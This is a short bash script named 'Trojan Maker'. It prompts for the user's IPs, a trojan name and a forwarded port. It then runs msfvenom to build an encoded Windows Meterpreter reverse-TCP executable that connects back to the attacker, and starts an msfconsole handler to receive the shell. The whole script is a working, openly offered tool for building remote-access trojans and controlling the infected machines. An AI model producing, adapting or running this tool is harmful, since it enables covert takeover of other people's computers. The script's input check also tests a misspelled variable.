#/////////////////////////////////
clear

figlet Trojan Maker :

echo "---------------------"
echo "Make sure that Metasploit is still working !"
echo "---------------------"

echo "                     "

ifconfig

echo "                     "

read -p "Type your local ip : " lip

#/////////////////////////////////

clear

dig +short myip.opendns.com @resolver1.opendns.com

echo "                     "

read -p "Type your external ip : " eip

#/////////////////////////////////

clear

echo "---------------------"
read -p "Type your Trojan name : " tnm

#/////////////////////////////////

clear

echo "---------------------"
read -p "Type your port forwading of your router : " port

#/////////////////////////////////
clear


if [[ $lip != "" && $eip != "" && tnam != "" ]]; then
    clear
    msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -a x64 -e x64/xor_dynamic -i 10 lhost=$eip lport=$port -o trojan_place/$tnm.exe
    clear
    msfconsole -x "use multi/handler ; set payload windows/x64/meterpreter/reverse_tcp ; set lhost $lip ; set lport $port ; clear ;show options;echo 'Dont shutdown your wifi or your router because external ip will change !!!' ; exploit"
fi